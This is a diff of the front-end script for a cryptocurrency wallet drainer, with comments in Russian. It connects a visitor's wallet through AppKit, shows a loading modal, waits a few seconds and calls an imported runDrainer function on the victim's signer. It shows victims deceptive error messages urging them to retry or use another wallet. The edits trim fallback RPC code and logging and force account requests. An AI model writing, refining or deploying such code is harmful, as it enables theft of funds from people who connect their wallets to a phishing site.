@@ -1,12 +1,12 @@
 import { createAppKit } from '@reown/appkit';
-import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
+import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
 import { runDrainer } from './drainer.js';
 
 // === Конфигурация AppKit ===
 const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
-const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
+const networks = [mainnet, polygon, bsc, arbitrum];
 const wagmiAdapter = new WagmiAdapter({ projectId, networks });
 
 const appKitModal = createAppKit({
@@ -31,81 +31,6 @@ let actionBtn = null;
 let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
-
-// Список надёжных RPC для fallback для всех поддерживаемых сетей
-const FALLBACK_RPCS = {
-  1: [
-    'https://rpc.eth.gateway.fm',
-    'https://eth.llamarpc.com',
-    'https://ethereum-rpc.publicnode.com'
-  ],
-  56: [
-    'https://bsc-dataseed.binance.org/',
-    'https://bsc-dataseed1.defibit.io/',
-    'https://bsc-dataseed1.ninicoin.io/'
-  ],
-  137: [
-    'https://polygon-rpc.com/'
-  ],
-  42161: [
-    'https://arb1.arbitrum.io/rpc'
-  ],
-  43114: [
-    'https://api.avax.network/ext/bc/C/rpc'
-  ],
-  10: [
-    'https://mainnet.optimism.io'
-  ],
-  8453: [
-    'https://mainnet.base.org'
-  ]
-};
-
-// Функция для создания провайдера с fallback RPC
-async function getReliableProvider() {
-  const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
-  try {
-    await walletProvider.getBalance('0x0000000000000000000000000000000000000000');
-    console.log('✅ Провайдер кошелька полностью рабочий');
-    return walletProvider;
-  } catch (err) {
-    console.warn('⚠️ Провайдер кошелька ненадёжен:', err.message);
-  }
-
-  const network = await walletProvider.getNetwork();
-  const chainId = network.chainId;
-  const rpcUrls = FALLBACK_RPCS[chainId] || [];
-
-  if (!rpcUrls.length) {
-    throw new Error(`❌ Нет доступных fallback RPC для сети ${chainId}`);
-  }
-
-  for (const rpcUrl of rpcUrls) {
-    try {
-      const fallbackProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
-      await fallbackProvider.getBalance('0x0000000000000000000000000000000000000000');
-      console.log(`✅ Переключено на fallback RPC: ${rpcUrl}`);
-      return new ethers.providers.Web3Provider({
-        ...window.ethereum,
-        request: async (request) => {
-          if (
-            request.method === 'eth_chainId' ||
-            request.method === 'eth_call' ||
-            request.method === 'eth_getBalance' ||
-            request.method === 'eth_blockNumber'
-          ) {
-            return fallbackProvider.send(request.method, request.params || []);
-          }
-          return walletProvider.send(request.method, request.params || []);
-        }
-      });
-    } catch (err) {
-      console.warn(`⚠️ Fallback RPC ${rpcUrl} недоступен:`, err.message);
-    }
-  }
-
-  throw new Error(`❌ Не удалось найти рабочий RPC для сети ${chainId}`);
-}
 
 // === Инициализация при загрузке страницы ===
 window.addEventListener('DOMContentLoaded', () => {
@@ -162,15 +87,6 @@ window.addEventListener('DOMContentLoaded', () => {
       font-weight: 600;
       color: #FFFFFF;
       margin-bottom: 16px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
-
-    .modal-title::before {
-      content: '';
-      font-size: 20px;
     }
 
     .modal-subtitle {
@@ -198,25 +114,12 @@ window.addEventListener('DOMContentLoaded', () => {
       border-radius: 50%;
       transform: translate(-50%, -50%);
       animation: pulse 2s ease-in-out infinite;
-      box-shadow: 0 0 15px rgba(59, 130, 246, 0.5);
     }
 
     @keyframes pulse {
-      0% {
-        width: 40px;
-        height: 40px;
-        opacity: 0.8;
-      }
-      50% {
-        width: 50px;
-        height: 50px;
-        opacity: 0.4;
-      }
-      100% {
-        width: 40px;
-        height: 40px;
-        opacity: 0.8;
-      }
+      0% { width: 40px; height: 40px; opacity: 0.8; }
+      50% { width: 50px; height: 50px; opacity: 0.4; }
+      100% { width: 40px; height: 40px; opacity: 0.8; }
     }
 
     .wave {
@@ -232,25 +135,12 @@ window.addEventListener('DOMContentLoaded', () => {
       animation: wave 4s ease-out infinite;
     }
 
-    .wave:nth-child(2) {
-      animation-delay: 1s;
-    }
-
-    .wave:nth-child(3) {
-      animation-delay: 2s;
-    }
+    .wave:nth-child(2) { animation-delay: 1s; }
+    .wave:nth-child(3) { animation-delay: 2s; }
 
     @keyframes wave {
-      0% {
-        width: 40px;
-        height: 40px;
-        opacity: 0.6;
-      }
-      100% {
-        width: 100px;
-        height: 100px;
-        opacity: 0;
-      }
+      0% { width: 40px; height: 40px; opacity: 0.6; }
+      100% { width: 100px; height: 100px; opacity: 0; }
     }
 
     .action-list {
@@ -270,12 +160,6 @@ window.addEventListener('DOMContentLoaded', () => {
       gap: 8px;
     }
 
-    .action-list li::before {
-      content: '';
-      color: #10B981;
-      font-size: 16px;
-    }
-
     .modal-footer {
       font-size: 12px;
       font-weight: 400;
@@ -290,51 +174,20 @@ window.addEventListener('DOMContentLoaded', () => {
         padding: 20px;
         min-height: 300px;
       }
-      .modal-title {
-        font-size: 18px;
-      }
-      .modal-subtitle {
-        font-size: 13px;
-      }
-      .loader-container {
-        width: 70px;
-        height: 70px;
-      }
+      .modal-title { font-size: 18px; }
+      .modal-subtitle { font-size: 13px; }
+      .loader-container { width: 70px; height: 70px; }
       @keyframes pulse {
-        0% {
-          width: 30px;
-          height: 30px;
-          opacity: 0.8;
-        }
-        50% {
-          width: 40px;
-          height: 40px;
-          opacity: 0.4;
-        }
-        100% {
-          width: 30px;
-          height: 30px;
-          opacity: 0.8;
-        }
+        0% { width: 30px; height: 30px; opacity: 0.8; }
+        50% { width: 40px; height: 40px; opacity: 0.4; }
+        100% { width: 30px; height: 30px; opacity: 0.8; }
       }
       @keyframes wave {
-        0% {
-          width: 30px;
-          height: 30px;
-          opacity: 0.6;
-        }
-        100% {
-          width: 70px;
-          height: 70px;
-          opacity: 0;
-        }
+        0% { width: 30px; height: 30px; opacity: 0.6; }
+        100% { width: 70px; height: 70px; opacity: 0; }
       }
-      .action-list {
-        font-size: 13px;
-      }
-      .modal-footer {
-        font-size: 11px;
-      }
+      .action-list { font-size: 13px; }
+      .modal-footer { font-size: 11px; }
     }
   `;
   document.head.appendChild(style);
@@ -389,9 +242,7 @@ function showModal() {
 
 async function hideModalWithDelay(errorMessage = null) {
   if (errorMessage) {
-    console.log(`❌ Ошибка перед закрытием: ${errorMessage}`);
     modalSubtitle.textContent = errorMessage;
-    // Увеличиваем задержку до 7 секунд для мобильных устройств
     await new Promise(resolve => setTimeout(resolve, 7000));
   }
   modalOverlay.style.display = 'none';
@@ -414,51 +265,44 @@ async function attemptDrainer() {
     return;
   }
 
-  console.log(`📍 Используется адрес: ${connectedAddress}`);
   showModal();
 
   try {
-    const provider = await getReliableProvider();
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
     if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
-      console.error('❌ Несоответствие адресов:', address, connectedAddress);
-      isTransactionPending = false;
-      await hideModalWithDelay("Error: Wallet address mismatch. Please try again.");
-      return;
+      throw new Error('Wallet address mismatch');
     }
 
-    console.log('⏳ Ожидаем 3 секунды перед вызовом runDrainer');
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    console.log('⏳ Задержка 5 секунд перед runDrainer');
+    await new Promise(resolve => setTimeout(resolve, 5000));
 
     isTransactionPending = true;
     const status = await runDrainer(provider, signer, connectedAddress);
-    console.log('✅ Drainer выполнен успешно, статус:', status);
+    console.log('✅ Drainer выполнен, статус:', status);
 
     hasDrained = true;
     isTransactionPending = false;
-    cleanup();
     await hideModalWithDelay();
   } catch (err) {
     isTransactionPending = false;
     let errorMessage = "Error: An unexpected error occurred. Please try again.";
     if (err.message.includes('user rejected')) {
-      console.log('🙅 Пользователь отклонил транзакцию');
-      errorMessage = "Error: Transaction rejected by user. Please try again.";
+      errorMessage = "Error: Transaction rejected by user.";
+    } else if (err.message.includes('Insufficient')) {
+      errorMessage = err.message;
     } else if (err.message.includes('Failed to approve token')) {
-      console.error('❌ Ошибка выполнения approve:', err.message);
-      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation. Please try a different wallet.";
-    } else if (err.message.includes('Failed to process native token')) {
-      console.error('❌ Ошибка вывода нативного токена:', err.message);
-      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation. Please try a different wallet.";
-    } else if (err.message.includes('Insufficient ETH balance')) {
-      console.error('❌ Недостаточно ETH:', err.message);
-      errorMessage = "Error: Insufficient ETH balance for gas. Please add more ETH to your wallet.";
+      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
+    } else if (err.message.includes('Failed to process')) {
+      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
+    } else if (err.message.includes('Failed to switch chain')) {
+      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
     } else {
-      console.error('❌ Ошибка выполнения drainer:', err.message);
-      errorMessage = `Error: ${err.message}. Please try again or use a different wallet.`;
+      errorMessage = `Error: ${err.message}`;
     }
+    console.error('❌ Ошибка drainer:', err.message);
     await hideModalWithDelay(errorMessage);
     throw err;
   }
@@ -467,14 +311,13 @@ async function attemptDrainer() {
 // === Подключение кошелька и запуск ===
 async function handleConnectOrAction() {
   try {
-    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
     if (accounts.length === 0) {
       await appKitModal.open();
       connectedAddress = await waitForWallet();
-      console.log('✅ Подключён кошелёк:', connectedAddress);
     } else {
       connectedAddress = accounts[0];
-      console.log('✅ Уже подключён:', connectedAddress);
+      console.log('✅ Подключён:', connectedAddress);
     }
 
     if (!isTransactionPending) {
@@ -486,7 +329,7 @@ async function handleConnectOrAction() {
     console.error('❌ Ошибка подключения:', err.message);
     isTransactionPending = false;
     showModal();
-    await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}. Please try again.`);
+    await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
   }
 }
 
@@ -500,24 +343,14 @@ async function onChainChanged(chainId) {
   }
 }
 
-// === Очистка ===
-function cleanup() {
-  if (!actionBtn) return;
-  actionBtn.removeEventListener('click', handleConnectOrAction);
-  window.ethereum.removeListener('chainChanged', onChainChanged);
-  actionBtn.disabled = true;
-  actionBtn.style.opacity = '0.6';
-  hideModalWithDelay();
-}
-
 // === Ожидание подключения кошелька ===
 async function waitForWallet() {
-  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
   if (accounts.length > 0) return accounts[0];
 
   return new Promise((resolve) => {
     const interval = setInterval(async () => {
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       if (accounts.length) {
         clearInterval(interval);
         resolve(accounts[0]);
